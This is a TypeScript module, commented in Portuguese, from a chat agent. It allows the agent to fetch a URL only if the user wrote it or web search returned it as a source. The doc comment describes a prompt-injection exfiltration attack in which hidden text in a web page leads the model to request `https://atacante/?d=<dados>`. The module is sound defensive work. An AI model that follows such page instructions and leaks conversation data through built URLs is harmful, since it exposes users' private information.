import type { MessagePart } from '@chat-tess/shared';
import { z } from 'zod';
import type { HistoryMessage } from '../../domain/ports';
import { WEB_SEARCH_TOOL_NAME } from './web-search-tool';

/**
 * Endereços que chegaram ao agente por uma fonte que não é o modelo: os que o
 * usuário escreveu e as fontes devolvidas pela busca. Um endereço fora dessa
 * lista foi montado pelo modelo, e é assim que uma instrução escondida numa
 * página faria os dados da conversa saírem: pedindo a leitura de
 * `https://atacante/?d=<dados>`.
 */
export function wasUrlGivenToAgent(url: string, history: readonly HistoryMessage[]): boolean {
  const address = addressOf(url);
  return address !== null && givenAddresses(history).has(address);
}

function givenAddresses(history: readonly HistoryMessage[]): Set<string> {
  const urls = history.flatMap(({ role, parts }) =>
    parts.flatMap((part) => (role === 'user' ? urlsWrittenByUser(part) : searchSources(part))),
  );
  return new Set(urls.flatMap((url) => addressOf(url) ?? []));
}

/** Endereços com ou sem `https://`, como as pessoas escrevem. */
const URL_IN_TEXT = /(?:https?:\/\/)?(?:[\w-]+\.)+[\w-]+(?::\d+)?(?:[/?#][^\s<>"'`]*)?/gi;
const TRAILING_PUNCTUATION = /[.,;:!?)\]}]$/;
const OPENING_OF: Record<string, string> = { ')': '(', ']': '[', '}': '{' };

function urlsWrittenByUser(part: MessagePart): string[] {
  if (part.type !== 'text') {
    return [];
  }
  return (part.text.match(URL_IN_TEXT) ?? []).map((candidate) => {
    const url = withoutSentencePunctuation(candidate);
    return /^https?:\/\//i.test(url) ? url : `https://${url}`;
  });
}

/**
 * Tira do fim a pontuação que é da frase, não do endereço. Um fechamento fica
 * quando abre dentro do próprio endereço, como em `/wiki/Terra_(planeta)`.
 */
function withoutSentencePunctuation(candidate: string): string {
  let url = candidate;
  while (TRAILING_PUNCTUATION.test(url) && !endsClosingItsOwnBracket(url)) {
    url = url.slice(0, -1);
  }
  return url;
}

function endsClosingItsOwnBracket(url: string): boolean {
  const closing = url.at(-1) ?? '';
  const opening = OPENING_OF[closing];
  return opening !== undefined && url.split(opening).length >= url.split(closing).length;
}

const searchOutputSchema = z.object({
  externalContent: z.object({ sources: z.array(z.object({ url: z.string() })) }),
});

/**
 * Só as fontes contam: vêm do buscador. O texto da resposta da busca é escrito
 * por um LLM a partir da consulta, e o modelo poderia fazê-lo repetir um endereço.
 */
function searchSources(part: MessagePart): string[] {
  if (part.type !== 'tool_result' || part.toolName !== WEB_SEARCH_TOOL_NAME) {
    return [];
  }
  const output = searchOutputSchema.safeParse(part.output);
  return output.success ? output.data.externalContent.sources.map(({ url }) => url) : [];
}

/**
 * O que identifica a página: servidor, caminho e query. Ignora o protocolo, a
 * barra final e o fragmento, que mudam de uma escrita para outra do mesmo endereço.
 */
function addressOf(rawUrl: string): string | null {
  if (!URL.canParse(rawUrl)) {
    return null;
  }
  const { host, pathname, search } = new URL(rawUrl);
  return `${host}${pathname.replace(/\/+$/, '')}${search}`;
}
